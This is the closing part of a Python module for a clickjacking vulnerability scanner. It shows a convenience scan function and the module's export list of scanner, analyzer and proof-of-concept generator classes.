    return ClickjackingScanner(http_client=http_client, config=config)


async def scan_clickjacking(
    target_url: str,
    http_client: Any = None,
    **kwargs,
) -> List[ClickjackFinding]:
    """Convenience function to scan for clickjacking vulnerabilities."""
    scanner = create_clickjacking_scanner(http_client=http_client)
    return await scanner.scan(target_url, **kwargs)


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Version
    "VERSION",

    # Enums
    "ClickjackVulnType",
    "ProtectionLevel",
    "XFrameOptionsValue",

    # Data classes
    "FrameProtectionStatus",
    "ClickjackEndpoint",
    "ClickjackFinding",
    "ScanConfig",

    # Classes
    "ClickjackingScanner",
    "FrameProtectionAnalyzer",
    "ClickjackPoCGenerator",

    # Constants
    "SENSITIVE_ACTIONS",

    # Factory functions
    "create_clickjacking_scanner",
    "scan_clickjacking",
]
